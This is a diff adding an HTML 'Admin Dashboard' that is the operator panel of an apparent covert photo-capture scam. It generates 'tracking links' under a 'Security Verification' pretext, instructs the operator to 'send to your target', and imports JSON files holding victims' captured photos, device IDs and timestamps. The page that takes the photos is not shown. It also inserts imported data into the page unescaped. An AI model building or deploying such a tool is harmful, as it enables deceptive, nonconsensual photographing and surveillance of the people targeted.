@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background: linear-gradient(135deg, #1a2a6c 0%, #b21f1f 100%); min-height: 100vh; color: #333; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
+        header { background: rgba(255, 255, 255, 0.95); border-radius: 20px; padding: 30px; margin-bottom: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); text-align: center; }
+        h1 { color: #1a2a6c; margin-bottom: 10px; }
+        .dashboard { background: white; border-radius: 20px; padding: 30px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); }
+        .link-generator { background: #f8f9fa; padding: 20px; border-radius: 15px; margin-bottom: 30px; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; font-weight: 600; color: #1a2a6c; }
+        input[type="text"] { width: 100%; padding: 10px; border: 2px solid #ddd; border-radius: 8px; font-size: 14px; }
+        .btn { padding: 10px 20px; border: none; border-radius: 8px; cursor: pointer; font-size: 14px; font-weight: 600; margin: 5px; }
+        .generate-btn { background: linear-gradient(135deg, #1a2a6c 0%, #b21f1f 100%); color: white; }
+        .import-btn { background: linear-gradient(135deg, #28a745 0%, #20c997 100%); color: white; }
+        .clear-btn { background: linear-gradient(135deg, #dc3545 0%, #c82333 100%); color: white; }
+        .captures-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
+        .capture-card { background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 15px; padding: 15px; }
+        .capture-photo { width: 100%; height: 180px; object-fit: cover; border-radius: 10px; margin-bottom: 10px; }
+        .empty-state { text-align: center; padding: 40px; color: #6c757d; }
+        .instructions { background: #e7f3ff; padding: 15px; border-radius: 10px; margin: 20px 0; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🎯 Admin Dashboard</h1>
+            <p>Create tracking links and manage captured data</p>
+        </header>
+        
+        <div class="dashboard">
+            <div class="link-generator">
+                <h3>🔗 Create Tracking Link</h3>
+                <div class="instructions">
+                    <strong>How it works:</strong><br>
+                    1. Enter campaign name below<br>
+                    2. Copy the generated link<br>
+                    3. Send to your target<br>
+                    4. Target will download data file after verification<br>
+                    5. Upload the data file here to view
+                </div>
+                <div class="form-group">
+                    <label for="campaign-name">Campaign Name</label>
+                    <input type="text" id="campaign-name" placeholder="Enter campaign name" value="Security Verification">
+                </div>
+                <button id="generate-link" class="btn generate-btn">Generate Tracking Link</button>
+                <div id="generated-link" style="margin-top: 10px; word-break: break-all;"></div>
+            </div>
+            
+            <div style="margin: 30px 0;">
+                <h3>📤 Import Captured Data</h3>
+                <div class="instructions">
+                    Upload the JSON file that your target downloaded after verification
+                </div>
+                <input type="file" id="import-file" accept=".json" style="margin: 10px 0;">
+                <button id="import-btn" class="btn import-btn">Import Data</button>
+                <button id="clear-data" class="btn clear-btn" style="margin-left: 10px;">Clear All Data</button>
+            </div>
+            
+            <div>
+                <h3>📊 Captured Data</h3>
+                <div id="captures-container" class="captures-grid">
+                    <div class="empty-state">
+                        <h4>No data imported yet</h4>
+                        <p>Upload JSON files from your targets to view captured photos</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Data yang diimpor
+        let importedData = JSON.parse(localStorage.getItem('adminCaptures') || '[]');
+        
+        const campaignNameInput = document.getElementById('campaign-name');
+        const generateLinkBtn = document.getElementById('generate-link');
+        const generatedLinkDiv = document.getElementById('generated-link');
+        const importFileInput = document.getElementById('import-file');
+        const importBtn = document.getElementById('import-btn');
+        const clearDataBtn = document.getElementById('clear-data');
+        const capturesContainer = document.getElementById('captures-container');
+        
+        // Generate tracking link
+        generateLinkBtn.addEventListener('click', () => {
+            const campaignName = campaignNameInput.value.trim() || 'Security Verification';
+            const currentUrl = window.location.origin + '/index.html';
+            const trackingLink = `${currentUrl}?campaign=${encodeURIComponent(campaignName)}`;
+            
+            generatedLinkDiv.innerHTML = `
+                <strong>Tracking Link:</strong><br>
+                <a href="${trackingLink}" target="_blank" style="color: #1a2a6c; text-decoration: underline;">${trackingLink}</a>
+            `;
+        });
+        
+        // Import data
+        importBtn.addEventListener('click', () => {
+            const file = importFileInput.files[0];
+            if (!file) {
+                alert('Please select a JSON file to import');
+                return;
+            }
+            
+            const reader = new FileReader();
+            reader.onload = (e) => {
+                try {
+                    const data = JSON.parse(e.target.result);
+                    if (data.photo && data.timestamp) {
+                        importedData.unshift(data);
+                        localStorage.setItem('adminCaptures', JSON.stringify(importedData));
+                        renderCaptures();
+                        alert('Data imported successfully!');
+                        importFileInput.value = '';
+                    } else {
+                        throw new Error('Invalid data format');
+                    }
+                } catch (error) {
+                    alert('Error importing file: Invalid JSON format');
+                    console.error('Import error:', error);
+                }
+            };
+            reader.readAsText(file);
+        });
+        
+        // Clear all data
+        clearDataBtn.addEventListener('click', () => {
+            if (confirm('Are you sure you want to delete all imported data?')) {
+                importedData = [];
+                localStorage.setItem('adminCaptures', JSON.stringify(importedData));
+                renderCaptures();
+            }
+        });
+        
+        // Render captures
+        function renderCaptures() {
+            if (importedData.length === 0) {
+                capturesContainer.innerHTML = `
+                    <div class="empty-state">
+                        <h4>No data imported yet</h4>
+                        <p>Upload JSON files from your targets to view captured photos</p>
+                    </div>
+                `;
+                return;
+            }
+            
+            capturesContainer.innerHTML = importedData.map(data => {
+                const date = new Date(data.timestamp);
+                return `
+                    <div class="capture-card">
+                        <img src="${data.photo}" alt="Captured photo" class="capture-photo">
+                        <div style="font-size: 12px; color: #666;">
+                            <div><strong>Time:</strong> ${date.toLocaleString()}</div>
+                            <div><strong>Device:</strong> ${data.deviceId || 'Unknown'}</div>
+                            <div style="margin-top: 5px; word-break: break-word;">
+                                <strong>URL:</strong> ${data.url.substring(0, 30)}...
+                            </div>
+                        </div>
+                    </div>
+                `;
+            }).join('');
+        }
+        
+        // Load on page load
+        renderCaptures();
+    </script>
+</body>
+</html>
